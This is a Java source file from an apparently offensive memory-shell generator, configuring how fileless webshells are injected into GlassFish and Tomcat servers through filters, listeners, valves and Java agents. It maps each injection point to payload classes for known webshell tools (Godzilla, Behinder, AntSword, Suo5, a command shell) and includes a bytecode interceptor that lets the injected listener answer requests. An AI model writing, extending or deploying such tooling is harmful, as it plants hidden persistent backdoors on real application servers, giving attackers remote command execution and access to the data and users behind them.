package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.glassfish.injector.GlassFishFilterInjector;
import com.reajason.javaweb.memshell.glassfish.injector.GlassFishListenerInjector;
import com.reajason.javaweb.memshell.glassfish.injector.GlassFishValveInjector;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordValve;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderValve;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandValve;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Valve;
import com.reajason.javaweb.memshell.tomcat.injector.TomcatContextValveAgentInjector;
import com.reajason.javaweb.memshell.tomcat.injector.TomcatFilterChainAgentInjector;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/12
 */
public class GlassFishShell extends AbstractShell {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                try {
                    response = ShellCommonUtil.getFieldValue(request, "response");
                } catch (Exception ee) {
                    // glassfish7
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "reqFacHelper"), "response");
                }
            }
        }
    }

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(FILTER, GlassFishFilterInjector.class)
                .addInjector(JAKARTA_FILTER, GlassFishFilterInjector.class)
                .addInjector(LISTENER, GlassFishListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, GlassFishListenerInjector.class)
                .addInjector(VALVE, GlassFishValveInjector.class)
                .addInjector(JAKARTA_VALVE, GlassFishValveInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
                .build();
    }


    @Override
    protected void init() {
        Class<?> commandListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Command);
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(JAKARTA_FILTER, CommandFilter.class)
                .addShellClass(LISTENER, commandListenerClass)
                .addShellClass(JAKARTA_LISTENER, commandListenerClass)
                .addShellClass(VALVE, CommandValve.class)
                .addShellClass(JAKARTA_VALVE, CommandValve.class)
                .addShellClass(AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
                .build());

        Class<?> godzillaListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Godzilla);
        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(JAKARTA_FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, godzillaListenerClass)
                .addShellClass(JAKARTA_LISTENER, godzillaListenerClass)
                .addShellClass(VALVE, GodzillaValve.class)
                .addShellClass(JAKARTA_VALVE, GodzillaValve.class)
                .addShellClass(AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
                .build());

        Class<?> behinderListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Behinder);
        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(JAKARTA_FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, behinderListenerClass)
                .addShellClass(JAKARTA_LISTENER, behinderListenerClass)
                .addShellClass(VALVE, BehinderValve.class)
                .addShellClass(JAKARTA_VALVE, BehinderValve.class)
                .addShellClass(AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                .build());

        Class<?> suo5ListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Suo5);
        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(JAKARTA_FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, suo5ListenerClass)
                .addShellClass(JAKARTA_LISTENER, suo5ListenerClass)
                .addShellClass(VALVE, Suo5Valve.class)
                .addShellClass(JAKARTA_VALVE, Suo5Valve.class)
                .build());

        Class<?> antSwordListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.AntSword);
        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, antSwordListenerClass)
                .addShellClass(VALVE, AntSwordValve.class)
                .addShellClass(AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
                .build());
    }
}